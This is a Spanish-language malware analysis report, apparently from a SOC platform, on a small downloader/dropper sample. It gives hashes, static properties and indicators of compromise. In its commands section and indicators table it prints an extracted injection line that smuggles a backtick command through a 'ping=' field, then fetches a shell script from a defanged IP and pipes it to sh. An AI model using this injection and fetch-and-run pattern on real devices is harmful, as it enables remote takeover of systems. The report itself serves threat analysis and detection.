# 🧬 Payload Analysis

`41deccfe23ca86df8e2f1c76c376963a6833947c1e34a5cc41b74043b124b04f`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `41deccfe23ca86df8e2f1c76c376963a6833947c1e34a5cc41b74043b124b04f`
- **MD5:** `04c690a645e484f3c8b422b20bbf8d25`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 336 B |
| Entropía | 5.11 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
ping=[internal-ip-redacted]`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s airspan;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| hash | 41deccfe23ca86df8e2f1c76c376963a6833947c1e34a5cc41b74043b124b04f | static_analysis |
| command | ping=[internal-ip-redacted]`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s airspan;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|s | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
